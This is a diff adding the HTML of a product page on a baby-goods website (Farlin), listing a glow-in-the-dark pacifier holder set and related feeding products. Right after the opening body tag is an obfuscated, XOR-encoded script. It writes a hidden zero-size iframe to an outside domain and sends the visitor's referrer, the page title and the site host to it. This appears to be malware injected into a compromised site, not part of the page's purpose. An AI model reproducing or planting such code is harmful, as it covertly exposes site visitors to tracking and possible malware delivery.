@@ -1,0 +1,1376 @@
+
+
+<!DOCTYPE html >
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet' type='text/css'>
+	<link href='http://fonts.googleapis.com/css?family=Karla:400,700' rel='stylesheet' type='text/css'>    
+
+    <link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/farlin-style.css" type="text/css" />
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/global.css" type="text/css" />
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/camera.css" type="text/css" />
+    <link rel="shortcut icon" href="http://farlin.lk/wp-content/themes/KTI-lego/images/farlin-favicon.ico" type="image/x-icon" />
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/prettyPhoto.css"> 
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/js/fancybox/fancybox_latest/jquery.fancybox-1.3.4.css" type="text/css" />    
+	
+    <!--[if IE 8]>
+     <link rel="stylesheet" type="text/css" href="http://farlin.lk/wp-content/themes/KTI-lego/css/farlin-ie8.css" type="text/css" />
+    <![endif]-->
+    <!--[if IE 9]>
+     <link rel="stylesheet" type="text/css" href="http://farlin.lk/wp-content/themes/KTI-lego/css/farlin-ie9.css" type="text/css" />
+    <![endif]-->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script>
+	<script type='text/javascript' src="http://farlin.lk/wp-content/themes/KTI-lego/js/html5.js"></script>
+    <script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/tabs.js"></script>
+	<script type='text/javascript' src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.tinyscrollbar.min.js"></script>
+    <!--script type='text/javascript' src='http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.mobile.customized.min.js'></script-->
+    <script type='text/javascript' src='http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.easing.1.3.js'></script> 
+    <script type='text/javascript' src='http://farlin.lk/wp-content/themes/KTI-lego/js/camera.js'></script> 
+	<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.tinycarousel.min.js"></script>
+	<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/fancybox/fancybox_latest/jquery.fancybox-1.3.4.js"></script> 
+	
+    <script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/framework.js"></script>
+    <script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/gen_validatorv4.js"></script>   
+    <script type="text/javascript">
+    $(document).ready(function(){
+        
+        $(".menu-item-338").click(function(){
+            if($("#slide-div").is(":hidden")){
+                $("#slide-div").slideDown("slow");
+            } else {
+                $("#slide-div").slideUp("slow");
+            }
+        }); 
+
+		$('#slider2').tinycarousel(); 
+        $('#slider1').tinycarousel();  
+        $('#slider-code').tinycarousel();
+        
+    });
+</script> 
+    
+<link rel="alternate" type="application/rss+xml" title="Farlin &raquo; Feed" href="http://farlin.lk/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Farlin &raquo; Comments Feed" href="http://farlin.lk/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Farlin &raquo; Glow-in-Dark Pacifier Holder Set &#8211; 6M+ Comments Feed" href="http://farlin.lk/products/glow-in-dark-pacifier-holder-set-6m-top-101-2/feed/" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://farlin.lk/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://farlin.lk/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Glow-in-Dark Pacifier &#8211; 6M+' href='http://farlin.lk/products/glow-in-dark-pacifier-6m/' />
+<link rel='next' title='Stretchy Pacifier &#8211; 0M+' href='http://farlin.lk/products/stretchy-pacifier-0m/' />
+<meta name="generator" content="WordPress 3.4.1" />
+<script src='http://lego.lk/?dm=8c7b86a37a5aa180f6f627489cc2a089&amp;action=load&amp;blogid=2&amp;siteid=1&amp;t=343187948&amp;back=http%3A%2F%2Ffarlin.lk%2Fproducts%2Fglow-in-dark-pacifier-holder-set-6m-top-101-2%2F' type='text/javascript'></script>
+<!-- All in One SEO Pack 2.0.2 by Michael Torbert of Semper Fi Web Design[,] -->
+<meta name="description" content="TOP-101-2 &nbsp; - Unique glow-in-the-dark. - Safety ventilation holes. - Adjustable holder length." />
+
+<link rel="canonical" href="http://farlin.lk/products/glow-in-dark-pacifier-holder-set-6m-top-101-2/" />
+<!-- /all in one seo pack -->
+
+
+  
+   <style>
+    
+        #back_to_camera {
+            background: rgba(255,255,255,.9);
+            clear: both;
+            display: block;
+            height: 40px;
+            line-height: 40px;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .fluid_container {
+            bottom: 0;
+            /*height: 100%;*/
+            height:430px;
+            left: 0;
+            /*position: fixed;*/
+            right: 0;
+            top: 0;
+            z-index: 0;
+        }
+        #camera_wrap_4 {
+            bottom: 0;
+            height: 100%;
+            left: 0;
+            margin-bottom: 0!important;
+            /*position: fixed;*/
+            right: 0;
+            top: 0;
+        }
+        .camera_bar {
+            z-index: 2;
+        }
+        .camera_thumbs {
+            margin-top: -193px;
+            position: relative;
+            z-index: 1;
+        }
+        .camera_thumbs_cont {
+            border-radius: 0;
+            -moz-border-radius: 0;
+            -webkit-border-radius: 0;
+        }
+        .camera_overlayer {
+            opacity: .1;
+        }
+    </style>
+        
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-36584814-3']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+</head>
+<body><script type="text/javascript">var a="'1Aqapkrv'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00tl6,'00'02)'02'00p,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<!--camera html-->
+    <div class="header">
+	<div class="balance">
+    	<a href="http://farlin.lk"><div class="logo"></div></a>
+        <div class="mnu-cvr">
+        	<div class="menu-main-menu-container"><ul id="menu-main-menu" class="menu"><li id="menu-item-234" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-234"><a href="http://farlin.lk/">Home</a></li>
+<li id="menu-item-338" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-338"><a href="#">Products</a></li>
+<li id="menu-item-235" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-235"><a href="http://farlin.lk/about/">About</a></li>
+<li id="menu-item-233" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-233"><a href="http://farlin.lk/customer-care/">Customer Care</a></li>
+<li id="menu-item-232" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-232"><a href="http://farlin.lk/where-to-buy/">Where To Buy</a></li>
+<li id="menu-item-231" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-231"><a href="http://farlin.lk/mothers-room/">Mother&#8217;s Room</a></li>
+</ul></div> 
+                                   
+                <!--                   
+                 <ul>
+                            <li class="hasmore">
+                                <ul class="dropdown">
+                                        <div class="mnu-top-red"></div>
+                                                        <div class="slider_code" id="slider-code">
+                                                            <a class="buttons prev" href="#"></a>
+                                                            <div class="viewport">    
+                                                                <ul id="tabs">
+                                                                    <ul class="overview">
+                                                                    
+                                              
+                          <a href="http://farlin.lk/age_range/baby-cuddler/"><li><div class="mnu-tmb"><span>Baby Cuddler</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/baby-playpen/"><li><div class="mnu-tmb"><span>Baby Playpen</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/baby-stroller/"><li><div class="mnu-tmb"><span>Baby Stroller</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/baby-walker/"><li><div class="mnu-tmb"><span>Baby Walker</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bathing-skin-care/"><li><div class="mnu-tmb"><span>Bathing &amp; Skin Care</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bedding/"><li><div class="mnu-tmb"><span>Bedding</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bib-pant/"><li><div class="mnu-tmb"><span>Bib &amp; Pant</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/body-toilet-trainer/"><li><div class="mnu-tmb"><span>Body Toilet Trainer</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bottle-holder-strap/"><li><div class="mnu-tmb"><span>Bottle Holder &amp; Strap</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bottle-warmer/"><li><div class="mnu-tmb"><span>Bottle Warmer</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/breast-pumps/"><li><div class="mnu-tmb"><span>Breast Pumps</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/car-seat/"><li><div class="mnu-tmb"><span>Car Seat</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/cleaning/"><li><div class="mnu-tmb"><span>Cleaning</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/feeding/"><li><div class="mnu-tmb"><span>Feeding</span><img src="http://farlin.lk/files/2016/04/130-x-130.jpg" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/feeding-accessories/"><li><div class="mnu-tmb"><span>Feeding Accessories</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/feeding-bottles/"><li><div class="mnu-tmb"><span>Feeding Bottles</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/food-maker/"><li><div class="mnu-tmb"><span>Food Maker</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/footwear/"><li><div class="mnu-tmb"><span>Footwear</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/for-mom/"><li><div class="mnu-tmb"><span>For Mom</span><img src="http://farlin.lk/files/2012/12/mom_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/furniture-bedding/"><li><div class="mnu-tmb"><span>Furniture &amp; Bedding</span><img src="http://farlin.lk/files/2012/12/furniture_n_bedding_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/general-baby-health/"><li><div class="mnu-tmb"><span>General Baby Health</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gift-kits/"><li><div class="mnu-tmb"><span>Gift Kits</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gift-set/"><li><div class="mnu-tmb"><span>Gift Set</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gifts/"><li><div class="mnu-tmb"><span>Gifts</span><img src="http://farlin.lk/files/2013/02/Gifts_cat_thumb1.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/grooming-hygiene/"><li><div class="mnu-tmb"><span>Grooming &amp; Hygiene</span><img src="http://farlin.lk/files/2012/12/hygiene_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gum-soother/"><li><div class="mnu-tmb"><span>Gum Soother</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/health-safety/"><li><div class="mnu-tmb"><span>Health &amp; Safety</span><img src="http://farlin.lk/files/2012/12/health_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/high-chair/"><li><div class="mnu-tmb"><span>High Chair</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/maternity-items/"><li><div class="mnu-tmb"><span>Maternity Items</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/milk-powder-container/"><li><div class="mnu-tmb"><span>Milk Powder Container</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/nipples/"><li><div class="mnu-tmb"><span>Nipples</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/nursing-items/"><li><div class="mnu-tmb"><span>Nursing Items</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/oral-health/"><li><div class="mnu-tmb"><span>Oral Health</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/outgoing/"><li><div class="mnu-tmb"><span>Outgoing</span><img src="http://farlin.lk/files/2012/12/outing_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/outing-bag/"><li><div class="mnu-tmb"><span>Outing Bag</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/pacifier/"><li><div class="mnu-tmb"><span>Pacifier</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/plaything/"><li><div class="mnu-tmb"><span>Plaything</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/plaything-footwear/"><li><div class="mnu-tmb"><span>Plaything &amp; Footwear</span><img src="http://farlin.lk/files/2012/12/Plaything_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/safety-guard/"><li><div class="mnu-tmb"><span>Safety Guard</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/safety-pins/"><li><div class="mnu-tmb"><span>Safety Pins</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/sick-care/"><li><div class="mnu-tmb"><span>Sick Care</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/sterilizer/"><li><div class="mnu-tmb"><span>Sterilizer</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/tableware/"><li><div class="mnu-tmb"><span>Tableware</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/training-cup/"><li><div class="mnu-tmb"><span>Training Cup</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/weaning/"><li><div class="mnu-tmb"><span>Weaning</span><img src="http://farlin.lk/files/2012/12/weaning_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/wet-wipes/"><li><div class="mnu-tmb"><span>Wet Wipes</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                                                    
+                                                                    </ul>
+                                                                </ul>
+                                                            </div>
+                                                            <a class="buttons next" href="#"></a>
+                                                        </div>
+                                        <div class="mun-bottom-red"></div>    
+                                </ul>
+                            </li>
+                        </ul>       -->
+            
+            
+            <div class="serch-cvr">
+                	<div class="lft"></div>
+                    <div class="mid-cvr">
+                    
+                  <form action="http://farlin.lk" id="searchform" method="get">
+                                            <input type="text" placeholder="Search" id="s" name="s" class="mid">
+                  </form>
+              </div>
+                    <div class="right"></div>
+            </div>
+        </div>
+    </div>
+    <div id="slide-div">
+                    <div class="products-bg">
+                        <div class="middle-cvr">                    
+                                        <div class="feturted-product">    
+                                        
+                                        
+                                                        <div id="slider2">
+                                                <a class="buttons prev" href="#">left</a>
+                                                    <div class="viewport">
+                                                                <ul class="overview">
+                    							                          <a href="http://farlin.lk/age_range/feeding/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Feeding" src="http://farlin.lk/files/2016/04/130-x-130.jpg" />
+                                    <p>Feeding</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/for-mom/">
+                              <li class="ui-state-default"> 
+                                      <img alt="For Mom" src="http://farlin.lk/files/2012/12/mom_cat_thumb.gif" />
+                                    <p>For Mom</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/furniture-bedding/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Furniture &amp; Bedding" src="http://farlin.lk/files/2012/12/furniture_n_bedding_cat_thumb.gif" />
+                                    <p>Furniture &amp; Bedding</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/gifts/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Gifts" src="http://farlin.lk/files/2013/02/Gifts_cat_thumb1.gif" />
+                                    <p>Gifts</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/grooming-hygiene/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Grooming &amp; Hygiene" src="http://farlin.lk/files/2012/12/hygiene_cat_thumb.gif" />
+                                    <p>Grooming &amp; Hygiene</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/health-safety/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Health &amp; Safety" src="http://farlin.lk/files/2012/12/health_cat_thumb.gif" />
+                                    <p>Health &amp; Safety</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/outgoing/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Outgoing" src="http://farlin.lk/files/2012/12/outing_cat_thumb.gif" />
+                                    <p>Outgoing</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/plaything-footwear/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Plaything &amp; Footwear" src="http://farlin.lk/files/2012/12/Plaything_cat_thumb.gif" />
+                                    <p>Plaything &amp; Footwear</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/weaning/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Weaning" src="http://farlin.lk/files/2012/12/weaning_cat_thumb.gif" />
+                                    <p>Weaning</p>
+                              </li>
+                          </a>
+                         
+                                                                </ul>
+                                                    </div>
+                                                    <a class="buttons next" href="#">right</a>
+                                                </div>
+                                        </div>
+            
+                        
+                        </div>
+                    </div>
+            </div>
+</div>
+
+
+ 
+<title>Farlin | Glow-in-Dark Pacifier Holder Set &#8211; 6M+</title><!--jqery dropdown-->
+
+<script src="http://farlin.lk/wp-content/themes/KTI-lego/js/script.js" type="text/javascript"></script>  
+<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery-ui-1.8.23.custom.min.js"></script>
+<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/jquery-ui-1.8.23.custom.css" type="text/css" />         
+<script type="text/javascript">
+
+function test() {      
+        $('#auto_serach').val('');
+        $(this).css('outline','none');
+        $('#filter_dropdown_farlin.current').removeClass('current');
+        $(this).parent().addClass('current'); 
+        var filterVal = $('#filter_dropdown_farlin option:selected').val().toLowerCase().replace(' ','-');         
+        //alert(filterVal);    
+        if(filterVal == 'all') {
+            $('ul#portfolio li').fadeIn('slow').removeClass('hidden');
+        } else {            
+            $('ul#portfolio li').each(function() {
+                    if(!$(this).hasClass(filterVal)) {
+                        $(this).fadeOut('normal').addClass('hidden');
+                    }else{
+                        $(this).fadeIn('slow').removeClass('hidden');                             
+                }
+            });
+        }
+        
+        return false;
+  
+     
+}
+
+
+
+	$(document).ready(function(){
+
+		if (!$.browser.opera) { 
+        	// select element styling
+			$('select.select').each(function(){
+				var title = $(this).attr('title');
+				if( $('option:selected', this).val() != ''  ) title = $('option:selected',this).text();
+				$(this)
+					.css({'z-index':10,'opacity':0,'-khtml-appearance':'none'})
+					.after('<span class="select">' + title + '</span>')
+					.change(function(){
+						val = $('option:selected',this).text();
+						$(this).next().text(val);
+						})
+			});
+            
+            $('select.select2').each(function(){
+                    var title = $(this).attr('title');
+                    if( $('option:selected', this).val() != ''  ) title = $('option:selected',this).text();
+                    $(this)
+                           .css({'z-index':10,'opacity':0,'-khtml-appearance':'none'})
+                           .after('<span class="select">' + title + '</span>')
+                           .change(function(){
+                           val = $('option:selected',this).text();
+                           $(this).next().text(val);
+                                                        })
+                                            });                                      
+                                               
+                            $('#farlin_select1').change(function(){
+                                $.ajax({
+                                            type: "POST", 
+                                            url: 'http://farlin.lk/farlin-ajax/',
+                                            data: {method:'getChildren',value:this.value},     
+                                            success: function(data) {      //alert('vv');
+                                            $('.sec3').html(data);
+                                          }
+                                        });
+                            }); 
+            
+            
+
+		};
+		
+	});
+</script>
+
+<style type="text/css">
+.breadcrumb {
+padding-left: 10px;
+font-size: 10px;
+}
+</style>
+
+<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.paginate.js"></script>  
+    <div class="pre-bg">
+	
+		    <div class="wrapper">      
+    	<div class="hero">
+            <section class="right-sec product-right-sec">
+            	<div id="gallery">
+	
+    <div id="slides">    
+<div class="slide"><img src="http://farlin.lk/files/2013/01/TOP-101-2_product_main.gif" width="510" height="402" alt="side" /></div>	</div>
+    
+    <div id="menu2" >
+    
+    <ul>
+        <li class="fbar">&nbsp;</li>
+      <li class="menuItem"><a href=""><img src="http://farlin.lk/files/2013/01/TOP-101-2_product_main.gif" alt="thumbnail" /></a></li>     	       </ul>
+    
+    
+    </div>
+    
+  </div>
+            </section>
+        	<section class="lft-sec lft-sec-product-pge">
+                <h1>Glow-in-Dark Pacifier Holder Set &#8211; 6M+</h1>                 
+                <p>
+                	<p>TOP-101-2</p>
+<p>&nbsp;</p>
+<p>- Unique glow-in-the-dark.<br />
+- Safety ventilation holes.<br />
+- Adjustable holder length.</p>
+				</p>
+                <section class="social-sec social-sec-product-pge">
+            	<ul style="list-style:none !important;width: 197px;">
+                	<li><span>Share with</span></li>
+                    <a href="http://www.facebook.com/sharer.php?u=http://farlin.lk/products/glow-in-dark-pacifier-holder-set-6m-top-101-2/&t=Glow-in-Dark Pacifier Holder Set &#8211; 6M+" target="blank"><li><img border="0" src="http://farlin.lk/wp-content/themes/KTI-lego/images/fb.png"></li></a>
+                	<a href="http://twitter.com/home?status=Currently reading http://farlin.lk/products/glow-in-dark-pacifier-holder-set-6m-top-101-2/" title="Glow-in-Dark Pacifier Holder Set &#8211; 6M+" target="_blank"> <li><img border="0" src="http://farlin.lk/wp-content/themes/KTI-lego/images/twtr.png"></li></a>
+                   
+                   <!-- <li><img src="http://farlin.lk/wp-content/themes/KTI-lego/images/social_23.png"></li>     -->
+                </ul>
+                <ul style="float:left;width: 101px; list-style:none !important">
+                <li style="width:100px"><a href="http://www.happiness.lk/index.php/top1012-glow-in-dark-pacifier-holder-set-6m.html" target="_blank"><div class="buy-now">Buy Now</div></a></li>
+            	</ul>
+            </section>
+            <section class="download-sec download-sec-product-pge">
+				<ul>
+                
+                     
+                
+                						                </ul>
+            </section>
+                
+            </section> 
+            <section class="more-products-cvr">
+            	<div class="more-products-head">
+                	<section class="sec1"><span><h2>More Products</h2></span></section> 
+                                                
+                        
+                        
+                        
+                        
+                                              
+                           <section class="farlin-sec2">
+                        <select class="select2" id="farlin_select1"  title="Select two">
+                     
+                                                                           <option value="71" selected="selected">Feeding</option>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+                        </select>
+                    </section>                             
+                    <section class="sec3">
+                        
+                        <select class="select" title="Select one"  id="filter_dropdown_farlin" name="filter_dropdown_farlin" onchange="test()">
+                                            <option value="ALL">ALL</option>
+                                                                                               
+                                <option value='135'>Feeding Accessories</option>
+                                                                                          
+                                <option value='136'>Feeding Bottles</option>
+                                                                                          
+                                <option value='137'>Gum Soother</option>
+                                                                                          
+                                <option value='138'>Nipples</option>
+                                                                                          
+                                <option value='139'>Pacifier</option>
+                                                 
+                        </select>
+                    </section> 
+                    
+                    
+                    
+                     
+                    <section class="sec4">
+                    	<div class="serch-box">
+                        	<div class="p1"></div>
+                            <div class="p2"><input type="text" class="txt-srch" id="auto_serach"><a href="#"></a></div>
+                            <div class="p3"></div>
+                        </div>
+                    </section>
+                </div>
+                <section class="product-set">
+                
+                  <div id="paginationdemo" class="demo">
+             
+                
+              
+                   
+
+           
+           
+           
+           
+           
+           
+              
+<script>
+    $(function() {      
+        $( "#auto_serach" ).autocomplete({ source:["Glass Bottle","Glass Bottle","Color-Shield Orthodontic Pacifier","One-Piece Teether Pacifier","Pacifier Clip","One-Piece Pacifier","Auto-Close Silicone Pacifier","Silicone Gum Soother","Rubber Gum Soother","ooling Gum Soother","ooling Gum Soother","Cooling Gum Soother","Rubber Gum Soother","Rubber Gum Soother","ap and Screw for Standard Feeding Bottle","Cap and Screw for Standard Feeding Bottle","Wide Neck Glass Feeding Bottle","Both-Hand Bottle-Handle","Unbreakable Insulated Bottle","Nipple-Hole Puncher","Stretchy Pacifier Set \u2013 6M+","Stretchy Pacifier \u2013 6M+","Stretchy Pacifier \u2013 0M+","Glow-in-Dark Pacifier Holder Set \u2013 6M+","Glow-in-Dark Pacifier \u2013 6M+","Glow-in-Dark Pacifier \u2013 6 to 18M","Stretchy Anti-Colic Fur-Preventing Nipple \u2013 For Wide-neck \u2013 2pc pack","Stretchy Anti-Colic Fur-Preventing Nipple \u2013 For Standard-neck \u2013 2pc pack","Silicone Gum Soother","Cooling Gum Soother","Cooling Gum Soother","PP Feeding Bottle \u2013 Standard Neck 240cc","PES Feeding Bottle \u2013 Wide Neck 270cc","PES Feeding Bottle \u2013 Wide Neck 140cc","New Touch Silicone Feeding Bottle 240cc","New Touch Silicone Feeding Bottle 240cc","Heat Resistant Glass Feeder \u2013 Standard Neck 240cc","Heat Resistant Glass Feeder \u2013 Standard Neck 120cc","Glass Feeding Bottle \u2013 Standard Neck 240cc","Soft Straw Set","Milk Storage Bottle Set + 5 Storage Bottles","Milk Storage Bottle 3pc box","Milk Storage Bag (200cc) 20+2 pack","Fruit Series Pacifier (6M+)","Fruit Series Pacifier (0M+)","Anti-Colic Silicone Nipple \u2013 For Wide-neck \u2013 2pc pack","Anti-Colic Silicone Nipple \u2013 For Standard-neck \u2013 2pc pack","Cooling Gum Soother","Cooling Gum Soother","Glass Feeding Bottle \u2013 Standard Neck 120cc","Glass Feeding Bottle \u2013 Standard Neck 60cc","Milk Storage Bag \u2013 120cc \u2013 20+2 pack"]});
+                                               
+    });
+</script>  
+             
+
+			
+            		
+					
+                    	                     
+                                             
+                                            <div id="p1" class="pagedemo _current" style="">  
+                                            <ul id="portfolio">
+                                   
+                     
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  glassbottle">
+                        	<a href="http://farlin.lk/products/glass-bottle-2/"><span><strong>Glass Bottle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-808R_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 136  glassbottle">
+                        	<a href="http://farlin.lk/products/glass-bottle/"><span><strong>Glass Bottle</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-707R_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 71 139  color-shieldorthodonticpacifier">
+                        	<a href="http://farlin.lk/products/color-shield-orthodontic-pacifier/"><span><strong>Color-Shield Orthodontic Pacifier</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/TOP-108_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
